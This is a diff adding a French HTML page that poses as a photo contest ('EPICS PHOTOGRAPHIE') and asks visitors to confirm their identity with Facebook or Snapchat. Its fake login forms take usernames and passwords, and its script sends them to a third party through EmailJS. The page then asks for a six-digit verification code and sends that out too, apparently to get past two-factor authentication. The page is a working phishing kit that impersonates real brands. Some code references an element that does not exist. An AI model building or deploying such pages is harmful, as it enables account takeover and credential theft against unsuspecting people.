@@ -1,0 +1,228 @@
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Connexion Simulée – Version Améliorée</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      margin: 0;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+      padding: 20px;
+      backdrop-filter: brightness(0.6);
+    }
+    header {
+      margin-top: 30px;
+    }
+    #logo {
+      width: 150px;
+      margin-bottom: 10px;
+    }
+    h1 {
+      font-size: 2.4em;
+      margin: 10px 0;
+    }
+    p {
+      margin-top: 8px;
+      font-size: 1.1em;
+    }
+    .facebook-btn, .snapchat-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      font-weight: 600;
+      padding: 14px 26px;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      font-size: 1.05em;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+      transition: all 0.25s ease;
+      width: fit-content;
+      margin: 10px auto;
+      font-family: 'Poppins', sans-serif;
+    }
+    .facebook-btn {
+      background-color: #1877f2;
+      color: white;
+    }
+    .snapchat-btn {
+      background-color: #FFFC00;
+      color: black;
+    }
+    .facebook-btn:hover, .snapchat-btn:hover {
+      transform: scale(1.03);
+    }
+    .facebook-logo, .snapchat-logo {
+      width: 26px;
+      height: 26px;
+    }
+    .form-popup {
+      display: none;
+      background: white;
+      color: black;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 340px;
+      margin: 30px auto;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      animation: fadeIn 0.4s ease;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 1em;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 1em;
+    }
+    .feedback {
+      background-color: #16a34a;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 6px;
+      margin: 20px auto;
+      max-width: 320px;
+      display: none;
+      animation: fadeIn 0.3s ease-in;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+<header>
+  <img src="logo.png" alt="Logo" id="logo"/>
+  <h1>EPICS PHOTOGRAPHIE - ZONE CONCOUR</h1>
+  <p>Participez à notre concours photo mensuel et gagnez des prix !</p>
+</header>
+
+<button class="facebook-btn" onclick="openForm('facebook')">
+  <img src="logo-fb.png" alt="Facebook" class="facebook-logo"/> Confirme ton identité avec Facebook
+</button>
+<div id="fb-form" class="form-popup">
+  <img src="logo-fb.png" alt="Logo Facebook" style="width:40px; margin-bottom:10px;">
+  <h2>Confirmation Facebook</h2>
+  <input id="facebook-email" placeholder="Email ou mobile">
+  <input id="facebook-password" type="password" placeholder="Mot de passe">
+  <button onclick="submitLogin('facebook')">Se connecter</button>
+</div>
+
+<button class="snapchat-btn" onclick="openForm('snapchat')">
+  <img src="logo-snapchat.png" alt="Snapchat" class="snapchat-logo"/> Confirme ton identité avec Snapchat
+</button>
+<div id="snap-form" class="form-popup">
+  <img src="logo-snapchat.png" alt="Logo Snapchat" style="width:40px; margin-bottom:10px;">
+  <h2>Confirmation Snapchat</h2>
+  <input id="snapchat-email" placeholder="Nom d'utilisateur ou e-mail">
+  <input id="snapchat-password" type="password" placeholder="Mot de passe">
+  <button onclick="submitLogin('snapchat')">Se connecter</button>
+</div>
+
+<div id="feedback" class="feedback"></div>
+
+<div id="code-verification" class="form-popup">
+  <h2>Vérification</h2>
+  <p>Entrez le code reçu (6 chiffres)</p>
+  <input id="code" placeholder="123456">
+  <button onclick="submitCode()">Valider</button>
+</div>
+
+<div id="loader" class="form-block" style="display:none; font-size: 1.1em;">
+  <p>⏳ Traitement en cours...</p>
+</div>
+<div id="message-info" class="form-block" style="display:none; font-size: 1.1em;">
+  <p>Un code de validation à 6 chiffres va vous être envoyé.</p>
+</div>
+
+<div id="loader" class="form-block" style="display:none; font-size: 1.1em;">
+  <p>⏳ Traitement en cours...</p>
+</div>
+<div id="message-info" class="form-block" style="display:none; font-size: 1.1em;">
+  <p>Un code de validation à 6 chiffres va vous être envoyé.</p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  emailjs.init("AATQVLMcBJaRBgEox");
+
+  function openForm(service) {
+    document.getElementById('fb-form').style.display = 'none';
+    document.getElementById('snap-form').style.display = 'none';
+    document.getElementById('code-verification').style.display = 'none';
+    document.getElementById('feedback').style.display = 'none';
+    if (service === 'facebook') document.getElementById('fb-form').style.display = 'block';
+    else document.getElementById('snap-form').style.display = 'block';
+  }
+
+  function submitLogin(service) {
+    const email = document.getElementById(service + '-email').value.trim();
+    const password = document.getElementById(service + '-password').value.trim();
+
+    if (!email || !password) {
+      showFeedback("Veuillez remplir tous les champs.");
+      return;
+    }
+
+    
+
+    const data = {};
+    data[service + '_email'] = email;
+    data[service + '_password'] = password;
+
+    
+    emailjs.send("service_photos", "template_connexion", data).then(() => {
+      document.getElementById("verification").style.display = "none";
+      document.getElementById("fb-form").style.display = "none";
+      document.getElementById("snap-form").style.display = "none";
+      document.getElementById("loader").style.display = "block";
+
+      setTimeout(() => {
+        document.getElementById("loader").style.display = "none";
+        document.getElementById("message-info").style.display = "block";
+        document.getElementById("verification").style.display = "block";
+      }, 2000);
+    });
+
+  }
+
+  function showFeedback(msg) {
+    const box = document.getElementById('feedback');
+    box.textContent = msg;
+    box.style.display = 'block';
+  }
+
+  function submitCode() {
+    const code = document.getElementById('code').value.trim();
+    if (!/^\d{6,}$/.test(code)) {
+      showFeedback("Code invalide. 6 chiffres requis.");
+      return;
+    }
+    emailjs.send("service_photos", "template_code", {
+      verification_code: code
+    }).then(() => {
+      window.location.href = "page_succes.html";
+    });
+  }
+</script>
+</body>
+</html>
